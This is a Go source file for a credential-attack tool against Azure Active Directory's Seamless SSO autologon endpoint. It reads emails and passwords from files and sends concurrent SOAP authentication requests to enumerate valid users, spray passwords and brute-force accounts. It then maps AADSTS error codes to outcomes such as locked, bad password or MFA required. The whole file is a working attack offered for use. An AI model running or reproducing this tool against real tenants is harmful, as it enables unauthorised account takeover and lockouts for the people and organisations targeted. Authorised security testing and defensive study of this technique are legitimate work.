package main

import (
	"bufio"
	"encoding/xml"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/google/uuid"
)

type stringFlag struct {
	set   bool
	value string
}

type xmlStruct struct {
	Dtext string `xml:"Body>Fault>Detail>error>internalerror>text"`
}

func (sf *stringFlag) Set(x string) error {
	sf.value = x
	sf.set = true
	return nil
}

func (sf *stringFlag) String() string {
	return sf.value
}

var (
	email         stringFlag
	password      stringFlag
	emailsFile    stringFlag
	passwordsFile stringFlag
	output        io.Writer
)

func requestAzureActiveDirectory(domain string, user string, password string) {
	requestid := uuid.New()
	MessageID := uuid.New()
	userID := uuid.New()
	now := time.Now()
	creates := now.Format(time.RFC3339Nano)
	expires := now.Add(time.Minute * 10).Format(time.RFC3339Nano)
	url := "https://autologon.microsoftazuread-sso.com/" + domain + "/winauth/trust/2005/usernamemixed?client-request-id=" + requestid.String()
	body := strings.NewReader(`<?xml version='1.0' encoding='UTF-8'?>
<s:Envelope xmlns:s='http://www.w3.org/2003/05/soap-envelope' xmlns:wsse='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd' xmlns:saml='urn:oasis:names:tc:SAML:1.0:assertion' xmlns:wsp='http://schemas.xmlsoap.org/ws/2004/09/policy' xmlns:wsu='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd' xmlns:wsa='http://www.w3.org/2005/08/addressing' xmlns:wssc='http://schemas.xmlsoap.org/ws/2005/02/sc' xmlns:wst='http://schemas.xmlsoap.org/ws/2005/02/trust' xmlns:ic='http://schemas.xmlsoap.org/ws/2005/05/identity'>
    <s:Header>
        <wsa:Action s:mustUnderstand='1'>http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>
        <wsa:To s:mustUnderstand='1'>` + url + `</wsa:To>
        <wsa:MessageID>urn:uuid:` + MessageID.String() + `</wsa:MessageID>
        <wsse:Security s:mustUnderstand="1">
            <wsu:Timestamp wsu:Id="_0">
                <wsu:Created>` + creates + `</wsu:Created>
                <wsu:Expires>` + expires + `</wsu:Expires>
            </wsu:Timestamp>
            <wsse:UsernameToken wsu:Id="uuid-` + userID.String() + `">
                <wsse:Username>` + user + `</wsse:Username>
                <wsse:Password>` + password + `</wsse:Password>
            </wsse:UsernameToken>
        </wsse:Security>
    </s:Header>
    <s:Body>
        <wst:RequestSecurityToken Id='RST0'>
            <wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>
                <wsp:AppliesTo>
                    <wsa:EndpointReference>
                        <wsa:Address>urn:federation:MicrosoftOnline</wsa:Address>
                    </wsa:EndpointReference>
                </wsp:AppliesTo>
                <wst:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</wst:KeyType>
        </wst:RequestSecurityToken>
    </s:Body>
</s:Envelope>
`)
	// create a request object
	req, _ := http.NewRequest(
		"POST",
		url,
		body,
	)
	// add a request header
	req.Header.Add("Content-Type", "application/json; charset=UTF-8")
	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/94.0.992.50")
	// send an HTTP using `req` object
	res, err := http.DefaultClient.Do(req)
	// check for response error
	if err != nil {
		log.Fatal("Error:", err)
	}
	// read response body
	data, _ := ioutil.ReadAll(res.Body)
	// close response body
	res.Body.Close()
	// print response status and body
	if res.StatusCode != 200 {
		getResults(getCode(string(data)), user, password)
	} else {
		fmt.Fprintln(output, user+":"+password+" -> Existing user")
	}
}

func enumUsers(users_file string, password string) {

	users, err := os.Open(users_file)
	if err != nil {
		log.Fatal(err)
	}
	defer users.Close()
	scanner_users := bufio.NewScanner(users)
	for scanner_users.Scan() {
		user := scanner_users.Text()
		domain := strings.Split(user, "@")[1]
		go requestAzureActiveDirectory(domain, user, password)
	}
	if err := scanner_users.Err(); err != nil {
		log.Fatal(err)
	}
}

func passwordAttack(passwords_file string, user string, domain string) {

	passwords, err := os.Open(passwords_file)
	if err != nil {
		log.Fatal(err)
	}
	defer passwords.Close()
	scanner_passwords := bufio.NewScanner(passwords)
	for scanner_passwords.Scan() {
		go requestAzureActiveDirectory(domain, user, scanner_passwords.Text())
	}
	if err := scanner_passwords.Err(); err != nil {
		log.Fatal(err)
	}
}

func bruteForcing(users_file string, passwords_file string) {
	users, err := os.Open(users_file)
	if err != nil {
		log.Fatal(err)
	}
	defer users.Close()
	scanner_users := bufio.NewScanner(users)
	for scanner_users.Scan() {
		user := scanner_users.Text()
		domain := strings.Split(user, "@")[1]
		go passwordAttack(passwords_file, user, domain)
	}
	if err := scanner_users.Err(); err != nil {
		log.Fatal(err)
	}
}

func getCode(xmlcode string) string {
	// Extract error code from xml response
	x := xmlStruct{}
	_ = xml.Unmarshal([]byte(xmlcode), &x)
	errorCode := strings.Split(x.Dtext, ":")[0]
	return errorCode
}

func getResults(errorCode string, user string, password string) {

	switch {
	case errorCode == "AADSTS81016":
		fmt.Fprintln(output, user+":"+password+" -> Invalid STS request")
	case errorCode == "AADSTS50053":
		fmt.Fprintln(output, user+":"+password+" -> Locked")
	case errorCode == "AADSTS50126":
		fmt.Fprintln(output, user+":"+password+" -> Bad Password")
	case errorCode == "AADSTS50056":
		fmt.Fprintln(output, user+":"+password+" -> Exists w/no password")
	case errorCode == "AADSTS50014":
		fmt.Fprintln(output, user+":"+password+" -> Exists, but max passthru auth time exceeded")
	case errorCode == "AADSTS50076":
		fmt.Fprintln(output, user+":"+password+" -> Need mfa")
	case errorCode == "AADSTS700016":
		fmt.Fprintln(output, user+":"+password+" -> No app")
	case errorCode == "AADSTS50034":
		fmt.Fprintln(output, user+":"+password+" -> No user")
	}
}

func init() {
	flag.Var(&email, "email", "Example: user@domain.com")
	flag.Var(&password, "password", "Example: P@ssw0rd!")
	flag.Var(&emailsFile, "emails-file", "Example: /your/path/emails.txt")
	flag.Var(&passwordsFile, "passwords-file", "Example: /your/path/passwords.txt")
}

func main() {

	flag.Parse()

	filename := "output-" + time.Now().Format("20060102150405") + ".txt"
	fd, err := os.Create(filename)
	if err != nil {
		log.Print(err)
		os.Exit(1)
	}
	output = io.MultiWriter(os.Stdout, fd)

	if email.set && password.set {
		domain := strings.Split(email.value, "@")[1]
		requestAzureActiveDirectory(domain, email.value, password.value)
	}
	if emailsFile.set {
		if _, err := os.Stat(emailsFile.value); os.IsNotExist(err) {
			println("[!] The file doesn't exist")
			os.Exit(1)
		}
	}
	if passwordsFile.set {
		if _, err := os.Stat(passwordsFile.value); os.IsNotExist(err) {
			println("[!] The file doesn't exist")
			os.Exit(1)
		}
	}
	if passwordsFile.set && emailsFile.set {
		go bruteForcing(emailsFile.value, passwordsFile.value)
	}
	if email.set && passwordsFile.set {
		domain := strings.Split(email.value, "@")[1]
		go passwordAttack(passwordsFile.value, email.value, domain)
	}
	if emailsFile.set && password.set {
		enumUsers(emailsFile.value, password.value)
	}
	var input string
	fmt.Scanln(&input)
}
